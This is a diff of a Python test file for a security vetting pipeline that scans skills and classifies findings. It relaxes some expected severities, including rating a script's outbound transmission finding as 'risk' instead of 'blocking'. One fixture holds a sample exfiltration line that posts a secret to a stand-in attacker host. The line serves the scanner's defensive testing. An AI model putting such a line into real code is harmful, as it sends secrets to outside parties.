@@ -578,7 +578,7 @@ class TestVettingPipeline:
         assert "behavioral:local" in result.analyzers_used
         assert result.scan_report["behavioral_analysis"]["scanned_file_count"] >= 1
         assert any(f["source"] == "behavioral" for f in result.scan_report["findings"])
-        assert result.risk_level == RiskLevel.MALICIOUS
+        assert result.risk_level == RiskLevel.SUSPICIOUS
 
     def test_low_analyzability_does_not_raise_risk(self, skill_dir, monkeypatch):
         monkeypatch.setattr(
@@ -706,7 +706,7 @@ class TestVettingPipeline:
         )
 
         result, _violations, _name, _desc, _tools = VettingPipeline(
-            CompanyPolicy({"require_sandbox_for_risk": []})
+            CompanyPolicy({"require_sandbox_for_risk": [], "risk_classification": {"supply_chain": "blocking"}})
         ).vet(skill_dir, SourceInfo(origin=SkillOrigin.LOCAL), use_llm=True)
 
         assert result.risk_level == RiskLevel.MALICIOUS
@@ -751,7 +751,7 @@ class TestVettingPipeline:
         assert result.scan_report["risk_classification"]["blocking_count"] == 0
         assert result.scan_report["risk_classification"]["risk_count"] == 1
 
-    def test_documented_api_example_is_noise(self, default_policy):
+    def test_documented_api_example_defaults_to_notice(self, default_policy):
         classification = _classify_findings([{
             "rule": "E1",
             "severity": "MEDIUM",
@@ -769,7 +769,7 @@ class TestVettingPipeline:
         assert classification["items"][0]["classification"] == "noise"
         assert classification["items"][0]["classification_key"] == "documented_external_api"
 
-    def test_script_external_transmission_stays_blocking(self, default_policy):
+    def test_script_external_transmission_defaults_to_contextual_risk(self, default_policy):
         classification = _classify_findings([{
             "rule": "E1",
             "severity": "MEDIUM",
@@ -781,8 +781,8 @@ class TestVettingPipeline:
             "code_snippet": 'requests.post("https://evil.example/upload", data=secret)',
         }], default_policy)
 
-        assert classification["blocking_count"] == 1
-        assert classification["items"][0]["classification"] == "blocking"
+        assert classification["blocking_count"] == 0
+        assert classification["items"][0]["classification"] == "risk"
 
     def test_sandbox_flags_are_recorded(self, skill_dir, default_policy, monkeypatch):
         class FakeRunner:
